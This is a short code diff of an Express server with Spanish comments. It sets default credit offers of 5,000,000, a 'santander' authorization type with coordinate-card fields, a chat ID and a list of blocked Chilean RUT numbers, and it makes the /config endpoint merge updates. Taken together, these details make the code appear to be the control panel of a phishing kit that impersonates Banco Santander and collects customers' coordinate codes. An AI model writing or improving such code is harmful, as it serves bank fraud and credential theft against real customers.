@@ -19,12 +19,12 @@ const CHAT_ID = process.env.CHAT_ID;
 // Lista de RUTs bloqueados
 const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];
 
-// Configuración en memoria (puedes reemplazar con DB si quieres persistencia)
+// Configuración en memoria (se puede reemplazar con DB si quieres persistencia)
 let config = {
-  producto1: "",
-  monto1: "",
-  producto2: "",
-  monto2: "",
+  producto1: "Línea de Crédito",
+  monto1: 5000000,
+  producto2: "Tarjeta de Crédito WorldMember Limited Business",
+  monto2: 5000000,
   tipoAutorizacion: "santander",
   coord1: "",
   coord2: "",
@@ -93,8 +93,9 @@ app.get("/config", (req, res) => {
 });
 
 app.post("/config", (req, res) => {
-  config = req.body;
-  res.status(200).json({ message: "Configuración guardada" });
+  // Actualiza solo los campos enviados, manteniendo los demás
+  config = { ...config, ...req.body };
+  res.status(200).json({ message: "Configuración guardada", config });
 });
 
 // Iniciar servidor
